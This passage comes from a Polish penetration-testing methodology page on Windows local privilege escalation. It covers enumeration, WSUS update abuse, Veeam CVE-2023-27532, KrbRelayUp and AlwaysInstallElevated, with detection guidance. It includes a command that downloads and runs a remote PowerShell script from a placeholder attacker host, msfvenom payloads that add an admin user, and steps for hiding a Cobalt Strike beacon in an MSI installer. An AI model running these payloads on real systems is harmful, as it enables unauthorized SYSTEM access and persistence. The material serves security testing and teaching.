# Lokalna eskalacja uprawnień w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona zbiera ogólną metodykę eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Opisany tu praktyczny proces enumeracji opiera się również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację DerbyCon na temat eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy Windows

### Tokeny dostępu

**Jeśli nie wiesz, czym są tokeny dostępu w Windows, przed dalszą lekturą zapoznaj się z następującą stroną:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Więcej informacji o ACL — DACL/SACL/ACE znajdziesz na następującej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przed dalszą lekturą zapoznaj się z następującą stroną:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoją aktywność**. Przed rozpoczęciem enumeracji pod kątem eskalacji uprawnień **przeczytaj** następującą **stronę** i **sprawdź** wszystkie te mechanizmy **obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić wykorzystanie modyfikacji UEFI NVRAM w trybie offline do przeprowadzenia ataku DMA przed uruchomieniem systemu, a następnie załatania pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / ciche podnoszenie uprawnień przez UIAccess

Procesy UIAccess uruchomione za pośrednictwem `RAiLaunchAdminProcess` mogą zostać wykorzystane do uzyskania High IL bez monitów, jeśli kontrole bezpiecznej ścieżki AppInfo zostaną ominięte. Szczegółowy przebieg omijania UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację wpisów rejestru dostępności Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze z uprawnieniami SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

W nowszych kompilacjach Windows pojawiła się również ścieżka LPE z użyciem **SMB na dowolnym porcie**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest odbijane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy wersja Windows jest podatna na znane luki (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity dla konkretnych wersji

Ta [witryna](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach produktów Microsoft. Baza zawiera ponad 4 700 luk, co pokazuje **ogromną powierzchnię ataku**, jaką stwarza środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inwentaryzuje kompilację systemu operacyjnego, zainstalowane aktualizacje i wybrane potencjalnie pasujące porady dotyczące luk; przed uznaniem wyniku za mający zastosowanie zweryfikuj dokładny produkt i zastępujące go aktualizacje.

W przypadku lokalnego exploita zależnego od wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym Windows proces 32-bitowy podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje 32-bitowy katalog systemowy, a `%windir%\Sysnative` zapewnia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego lub brakująca aktualizacja KB nie dowodzą podatności na exploit; porównaj uruchomioną kompilację, zainstalowaną lub zastępującą ją aktualizację, architekturę procesu i wymagania exploita z [biuletynem zabezpieczeń Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające/Juicy info?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć, tutaj: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zwykle zapisują pliki w folderze Documents każdego użytkownika, ale ustawienie `OutputDirectory` lub parametr `-OutputDirectory` w poleceniu `Start-Transcript` mogą przekierować pliki do folderu współdzielonego lub ukrytego. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę wyjściową i ACL pliku: transkrypcja może zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Możliwość odczytu transkrypcji jest wskazówką tylko wtedy, gdy jej treść ujawnia dane tożsamości o wyższych uprawnieniach, które można wykorzystać do logowania w odpowiednim kontekście.

### PowerShell Module Logging

Zapisywane są szczegóły wykonania potoku PowerShell, w tym uruchomione polecenia, wywołania poleceń i fragmenty skryptów. Pełne szczegóły wykonania i wyniki mogą jednak nie zostać zarejestrowane.

Aby włączyć tę funkcję, postępuj zgodnie z instrukcjami w sekcji „Transcript files” dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić ostatnie 15 zdarzeń z logów PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowana jest pełna aktywność i kompletna zawartość skryptu podczas jego wykonywania, dzięki czemu każdy blok kodu jest dokumentowany w trakcie działania. Proces ten zapewnia kompleksowy ślad audytowy każdej aktywności, przydatny w analizie śledczej i badaniu złośliwego zachowania. Dokumentowanie całej aktywności w chwili wykonywania skryptu zapewnia szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowane dla Script Block można znaleźć w Podglądzie zdarzeń Windows w lokalizacji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Endpoint WSUS używający HTTP to wskazówka do dalszej analizy pod kątem przechwytywania metadanych aktualizacji. Możliwość wykorzystania zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić ruch lub nim sterować oraz od zasad zaufania i instalowania aktualizacji po stronie klienta. Sam URL nie oznacza możliwości wykonania kodu. [Microsoft zaleca używanie TLS dla metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Na początek sprawdź, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając w cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe polecenie w PowerShellu:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla ścieżki przechwytywania HTTP, ale nie dowodzi, że przechwytywanie, akceptacja złośliwej aktualizacji ani instalacja z podwyższonymi uprawnieniami są możliwe. Gdy ma wartość `0`, ta konkretna skonfigurowana lokalizacja WSUS nie jest wybierana przez tę zasadę.

Aby wykorzystać te podatności, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — są to uzbrojone skrypty exploitów MiTM, które wstrzykują „fałszywe” aktualizacje do niezaszyfrowanego ruchu WSUS.

Tutaj znajdziesz badania:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj cały raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo na tej luce polega ten exploit:

> Jeśli możemy zmodyfikować proxy naszego lokalnego użytkownika, a Windows Update korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i wykonać kod jako użytkownik z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa również jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z podpisem własnym dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać zarówno ruch HTTP, jak i HTTPS WSUS. WSUS nie używa mechanizmów podobnych do HSTS, które zapewniałyby walidację certyfikatu w modelu trust-on-first-use. Jeśli certyfikat przedstawiony przez usługę jest zaufany przez użytkownika i ma prawidłową nazwę hosta, zostanie zaakceptowany.

Możesz wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS kontrolowane przez administratora

Istnieje osobna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` serwera oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal, która grupa komputerów klienckich otrzymałaby zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [dokumentuje relację zaufania przy publikowaniu](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu dla treści publikowanych lokalnie. Zanim uznasz to za ścieżkę eskalacji, potwierdź, że proponowana aktualizacja jest podpisana i akceptowana, dotyczy celu oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane ładunki przez `.txt`/`.esd`

Jest to naruszenie innej granicy zaufania niż przechwytywanie połączenia HTTP WSUS: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** w zakresie wystarczającym do opublikowania i zatwierdzenia niestandardowej aktualizacji. Jedną z praktycznych dróg wejścia jest przekazanie uwierzytelnienia konta komputera WSUS do osobnego serwera MSSQL, na którym znajduje się `SUSDB`; dokładne wymagania zależą od wdrożenia, dlatego najpierw wylicz uprawnienia `EXECUTE`, zamiast zakładać, że wymagane są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o osobnej ścieżce ataku, w której uwierzytelnienie klienta WSUS jest przekazywane z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w artykule [Nadużywanie WSUS HTTP do przekazywania NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Utwórz, wybierz cel i zatwierdź aktualizację

Proces obsługi niestandardowej aktualizacji wykorzystuje legalne procedury WSUS jako ograniczone API do publikowania. Ważne zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Importuj metadane aktualizacji | `spImportUpdate` |
| Zapisz fragmenty XML dotyczące wymagań wstępnych, lokalizacji i rozszerzeń | `spSaveXMLFragment` |
| Powiąż skrót treści z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyświetl lub utwórz grupę komputerów i dodaj klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdź instalację dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i procedura obsługi `CommandLineInstallation` muszą być zgodne w zaimportowanych metadanych i fragmentach. Po przypisaniu adresu URL treści i grupy docelowej końcowe zatwierdzenie wygląda następująco; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia, zamiast ponownie wykorzystywać przykładowe identyfikatory GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Obejście weryfikacji podpisu sterowane rozszerzeniem

WSUS zwykle odrzuca dowolną, niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` jest wtedy pomijane bez wcześniejszego sprawdzenia, czy bajty są tekstem albo prawidłowym obrazem ESD. Dzięki temu niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji aktualizacji z wiersza poleceń. To błąd pomylenia polityki i typu, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging i automatyzacja zgodne z BITS

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Źródło musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer wykorzystuje początkowy przepływ `HEAD`/`GET` oraz żądania zakresu bajtów. Serwer bez obsługi Range generuje zdarzenie synchronizacji WSUS `EventId=364` z komunikatem, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Badawczy PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany dla łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do stagingu zawartości. Minimalne polecenie do użycia w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nieobsługiwana interakcja i trwałość przez ponawianie prób

Interakcja po stronie klienta zależy od zasad. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie z skonfigurowanym harmonogramem, bez konieczności ręcznego wyboru przez użytkownika. Podczas testów payload, którego aktualizacja pozostała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc ponawianie prób może zapewnić cykliczną trwałość przez wykonywanie kodu; jest to jednak widoczne, ponieważ klient pokazuje stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Wykrywanie i działania wzmacniające zabezpieczenia

Przydatne punkty kontrolne po stronie serwera i klienta w tym łańcuchu to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; sprawdzaj nowe grupy docelowe, zewnętrzne źródła zawartości, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanej nazwy `FileVerficationFailed` i `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą pliku, zamiast ufać rozszerzeniu.
- Wykrywaj wielokrotne niepowodzenia/ponowienia instalacji Windows Update oraz uruchamianie plików PE albo nieoczekiwaną aktywność potomnych procesów/sieciową z zawartości oznaczonej nazwami `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy danych do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur niestandardowych aktualizacji.

## Zewnętrzne mechanizmy automatycznej aktualizacji i IPC agentów (lokalny privesc)

Wiele agentów korporacyjnych udostępnia lokalny interfejs IPC oraz uprzywilejowany kanał aktualizacji. Jeśli rejestrację można wymusić na serwerze kontrolowanym przez atakującego, a mechanizm aktualizacji ufa fałszywemu głównemu CA lub stosuje słabe kontrole podpisującego, lokalny użytkownik może dostarczyć złośliwy plik MSI, który usługa SYSTEM zainstaluje. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi kopii zapasowych na **TCP/9401**. [Komunikat Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych danych uwierzytelniających do bazy konfiguracji w obrębie granicy sieci kopii zapasowych; osobny publiczny PoC pokazuje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać także poza localhost, dlatego sprawdź jej rzeczywisty adres i PID.

- **Rozpoznanie**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` są wskazówkami, ale nie wystarczają do pełnej weryfikacji poprawek.
- **Wersje bazowe z poprawką**: Veeam podaje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wydania zawierające poprawkę; wcześniejsze wydania są podatne. Sama czteroczęściowa wersja pliku nie pozwala odróżnić niezałatanej wersji bazowej od późniejszej poprawki dla tych samych numerów kompilacji. Przed uznaniem granicznej kompilacji za poprawioną zweryfikuj identyfikator poprawki w [historii kompilacji dostawcy](https://www.veeam.com/kb2680).
- **Wykorzystanie**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie uruchom payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Cytowany PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe wymagania wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.
## KrbRelayUp

Lokalny relay Kerberos może umożliwić przejście od logowania z niższymi uprawnieniami do zapisu w uprzywilejowanym katalogu, jeśli odpowiedni serwer COM uwierzytelni się, a przekazany principal ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zapisy LDAP zarówno RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiedniej delegacji i uprawnień do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu kluczy poświadczeń oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź faktyczną politykę kontrolera domeny dotyczącą [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [powiązania kanału LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL obiektu przypisaną przekazywanej tożsamości oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Znaczenie mają typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Routing zapory/OXID i zainstalowane aktualizacje również mogą zmienić wynik. Permisywną politykę lub pasującą ACL traktuj jako element wymagający weryfikacji; pasywna enumeracja nie powinna wywoływać COM coercion, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może prowadzić do uzyskania biletu maszyny i — tylko jeśli to konto ma wymagane uprawnienia do replikacji katalogu — do osobnej ścieżki DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz tutaj: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 rejestry są **włączone** (wartość **0x1**), użytkownicy z dowolnymi uprawnieniami mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z PowerUP, aby utworzyć w bieżącym katalogu plik binarny MSI systemu Windows służący do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (wymagany jest więc dostęp do GIU):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten tutorial, aby dowiedzieć się, jak utworzyć MSI wrapper za pomocą tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **polecenia**

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **nowy payload TCP dla Windows EXE** w lokalizacji `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizację ustaw **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż przejdziesz do kroku 3 z 4 (wybór plików do dołączenia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić także inne właściwości, takie jak **Author** i **Manufacturer**, dzięki czemu zainstalowana aplikacja może wyglądać bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij **Install** prawym przyciskiem myszy i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony natychmiast po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że jako platformę ustawiono x64.

### MSI Installation

Aby uruchomić **instalację** złośliwego pliku `.msi` **w tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i mechanizmy wykrywania

### Ustawienia inspekcji

Te ustawienia określają, co jest **rejestrowane**, więc zwróć na nie uwagę.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

